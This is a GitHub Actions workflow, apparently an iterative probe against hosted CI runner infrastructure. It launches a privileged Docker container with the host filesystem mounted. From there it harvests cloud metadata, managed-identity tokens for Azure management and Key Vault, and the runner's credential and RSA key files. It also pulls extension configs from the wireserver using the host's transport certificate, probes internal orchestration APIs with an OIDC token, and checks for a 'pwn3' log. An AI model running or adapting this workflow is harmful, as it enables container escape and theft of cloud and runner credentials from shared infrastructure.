name: "HC OIDC Primer v13 - Dynamic AllocID + Runner Creds + Extensions"
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  primer:
    runs-on: ubuntu-latest
    steps:
      - name: "Step 1: Get HC OIDC token"
        id: hc_token
        run: |
          echo "=== REQUESTING HC OIDC TOKEN ==="
          RESPONSE=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro")
          HC_JWT=$(echo "$RESPONSE" | jq -r '.value' 2>/dev/null)
          HC_JWT_LEN=$(printf '%s' "$HC_JWT" | wc -c)
          echo "HC_JWT_LEN=$HC_JWT_LEN"
          echo "hc_jwt=$HC_JWT" >> "$GITHUB_OUTPUT"

      - name: "Step 2: Write inner script to disk"
        run: |
          cat > /tmp/inner_v13.sh << 'ENDOFSCRIPT'
#!/bin/sh
set -x
apk add --no-cache curl openssl jq 2>&1

echo "=== IMDS TAGS - THIS RUN ==="
IMDS_RAW=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
ALLOC_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.allocation_id") | .value' 2>/dev/null)
BASE_RO_URL=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.base_ro_url") | .value' 2>/dev/null)
VM_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.vmId' 2>/dev/null)
VM_NAME=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.name' 2>/dev/null)
SUB_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.subscriptionId' 2>/dev/null)
QUOTA_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.quota_id") | .value' 2>/dev/null)
echo "ALLOC_ID=$ALLOC_ID"
echo "BASE_RO_URL=$BASE_RO_URL"
echo "VM_ID=$VM_ID"
echo "VM_NAME=$VM_NAME"
echo "SUB_ID=$SUB_ID"
echo "QUOTA_ID=$QUOTA_ID"

echo "=== MSI TOKEN ATTEMPTS ==="
MSI_MGMT=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null)
echo "MSI_MGMT=$MSI_MGMT"
MSI_VAULT=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" 2>/dev/null)
echo "MSI_VAULT=$MSI_VAULT"

echo "=== HC OIDC WITH CORRECT ALLOC_ID ==="
HC_JWT="${HC_OIDC_TOKEN}"
HC_JWT_LEN=$(printf '%s' "$HC_JWT" | wc -c)
echo "HC_JWT_LEN=$HC_JWT_LEN"

if [ -z "$ALLOC_ID" ]; then
  echo "ERROR: ALLOC_ID is empty"
else
  echo "--- $BASE_RO_URL/vms/$ALLOC_ID ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms/${ALLOC_ID}" 2>&1 | tail -35

  echo "--- $BASE_RO_URL/allocations/$ALLOC_ID ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/allocations/${ALLOC_ID}" 2>&1 | tail -35

  echo "--- $BASE_RO_URL/vms/$ALLOC_ID/config ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms/${ALLOC_ID}/config" 2>&1 | tail -25

  echo "--- $BASE_RO_URL/vms/$ALLOC_ID/status ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms/${ALLOC_ID}/status" 2>&1 | tail -25

  echo "--- $BASE_RO_URL/vms (list all) ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms" 2>&1 | tail -25

  ORCH_BASE=$(echo "$BASE_RO_URL" | sed 's|/vm/v1||')
  echo "--- $ORCH_BASE/ root ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${ORCH_BASE}/" 2>&1 | tail -20

  echo "--- $BASE_RO_URL/vms/$VM_ID ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms/${VM_ID}" 2>&1 | tail -15

  echo "--- $BASE_RO_URL/quotas/$QUOTA_ID ---"
  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/quotas/${QUOTA_ID}" 2>&1 | tail -15
fi

echo "=== RUNNER CREDENTIALS ==="
cat /host/home/runner/.credentials 2>/dev/null || echo NOT_FOUND_credentials
cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo NOT_FOUND_rsaparams
cat /host/home/runner/.runner 2>/dev/null || echo NOT_FOUND_runner
ls -la /host/home/runner/ 2>/dev/null
ls -la /host/home/runner/work/_temp/ 2>/dev/null | head -20
find /host/home/runner/work/_temp/ -name "*.json" 2>/dev/null | head -5 | xargs -I{} sh -c 'echo "=== {} ==="; cat {}' 2>/dev/null

echo "=== WAAGENT EXTENSIONS ==="
ls /host/var/lib/waagent/ 2>/dev/null
LIVE_GS=$(curl -s --cert /host/var/lib/waagent/TransportCert.pem --key /host/var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
EXT_URL=$(printf '%s' "$LIVE_GS" | grep -o '<ExtensionsConfig>[^<]*</ExtensionsConfig>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
echo "EXT_URL=$EXT_URL"
if [ -n "$EXT_URL" ]; then
  EXT_XML=$(curl -s --cert /host/var/lib/waagent/TransportCert.pem --key /host/var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "$EXT_URL" 2>/dev/null)
  echo "EXT_XML_LEN=${#EXT_XML}"
  printf '%s\n' "$EXT_XML" | head -100
fi

echo "=== ATTESTED DOCUMENT ==="
ATT=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>/dev/null)
echo "ATT_LEN=${#ATT}"
printf '%s' "$ATT" | jq . 2>/dev/null | head -20

echo "=== PRIMER STATUS ==="
ls -la /host/opt/primer/ 2>/dev/null
cat /host/tmp/hc_pwn3.log 2>/dev/null && echo PWN3_LOG_FOUND || echo PWN3_LOG_NOT_FOUND

echo "=== DONE v13 ==="
ENDOFSCRIPT
          chmod +x /tmp/inner_v13.sh

      - name: "Step 3: Run privileged docker with inner script"
        env:
          HC_OIDC_TOKEN: ${{ steps.hc_token.outputs.hc_jwt }}
        run: |
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            -v /tmp/inner_v13.sh:/inner.sh \
            -e HC_OIDC_TOKEN="${HC_OIDC_TOKEN}" \
            alpine:latest \
            /bin/sh /inner.sh

      - name: "Step 4: IMDS + MSI from runner + ENV"
        run: |
          echo "=== STEP 4: IMDS from runner ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '{
              vmId: .compute.vmId,
              name: .compute.name,
              subscriptionId: .compute.subscriptionId,
              imageRef: .compute.storageProfile.imageReference.id,
              tags: .compute.tags
            }' || true
          echo "=== MSI from runner ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true
          echo ""
          echo "=== ENV ==="
          env | grep -iE "ACTIONS|GITHUB|RUNNER" | grep -v "_TOKEN_REQUEST" | grep -v "SECRET" || true
          cat /tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
